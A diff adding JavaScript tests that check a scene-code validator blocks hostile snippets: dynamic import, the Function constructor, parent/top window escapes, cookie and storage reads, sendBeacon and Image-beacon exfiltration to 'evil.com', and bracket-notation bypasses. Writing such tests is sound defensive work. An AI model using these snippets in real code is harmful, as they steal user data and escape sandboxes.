@@ -42,4 +42,68 @@ describe('Composition Code Validator', () => {
     expect(result.valid).toBe(false);
     expect(result.errors.some((e) => e.includes('script'))).toBe(true);
   });
+
+  it('rejects dynamic import() and Function constructor', () => {
+    const dynImport = validateSceneCode({
+      buildJs: 'import("malicious.js"); tl.to(root, { opacity: 1 });'
+    });
+    expect(dynImport.valid).toBe(false);
+    expect(dynImport.errors.some((e) => e.includes('import'))).toBe(true);
+
+    const fnConstructor = validateSceneCode({
+      buildJs: 'const f = new Function("alert(1)"); f(); tl.to(root, { opacity: 1 });'
+    });
+    expect(fnConstructor.valid).toBe(false);
+    expect(fnConstructor.errors.some((e) => e.includes('Function'))).toBe(true);
+  });
+
+  it('rejects window traversal and global escape vectors (parent, top, window.parent, globalThis)', () => {
+    for (const snippet of [
+      'parent.postMessage("leak"); tl.to(root, { opacity: 1 });',
+      'window.parent.location = "x"; tl.to(root, { opacity: 1 });',
+      'top.location = "x"; tl.to(root, { opacity: 1 });',
+      'top["location"] = "x"; tl.to(root, { opacity: 1 });',
+      'globalThis.evil = true; tl.to(root, { opacity: 1 });'
+    ]) {
+      const res = validateSceneCode({ buildJs: snippet });
+      expect(res.valid).toBe(false);
+      expect(res.errors.length).toBeGreaterThan(0);
+    }
+  });
+
+  it('rejects client storage and exfiltration APIs (document.cookie, storage, indexedDB, sendBeacon, new Image)', () => {
+    for (const snippet of [
+      'const c = document.cookie; tl.to(root, { opacity: 1 });',
+      'localStorage.setItem("x", "1"); tl.to(root, { opacity: 1 });',
+      'sessionStorage.getItem("x"); tl.to(root, { opacity: 1 });',
+      'indexedDB.open("db"); tl.to(root, { opacity: 1 });',
+      'navigator.sendBeacon("https://evil.com"); tl.to(root, { opacity: 1 });',
+      'const img = new Image(); img.src = "https://evil.com"; tl.to(root, { opacity: 1 });'
+    ]) {
+      const res = validateSceneCode({ buildJs: snippet });
+      expect(res.valid).toBe(false);
+      expect(res.errors.length).toBeGreaterThan(0);
+    }
+  });
+
+  it('rejects bracket notation bypasses for protected keywords', () => {
+    for (const snippet of [
+      'window["fetch"]("x"); tl.to(root, { opacity: 1 });',
+      'window[\'eval\']("x"); tl.to(root, { opacity: 1 });',
+      'window[`parent`].focus(); tl.to(root, { opacity: 1 });',
+      'window["top"].focus(); tl.to(root, { opacity: 1 });'
+    ]) {
+      const res = validateSceneCode({ buildJs: snippet });
+      expect(res.valid).toBe(false);
+      expect(res.errors.some((e) => e.includes('bracket'))).toBe(true);
+    }
+  });
+
+  it('rejects performance.now() for non-deterministic timing', () => {
+    const res = validateSceneCode({
+      buildJs: 'const t = performance.now(); tl.to(root, { x: t });'
+    });
+    expect(res.valid).toBe(false);
+    expect(res.errors.some((e) => e.includes('performance.now'))).toBe(true);
+  });
 });
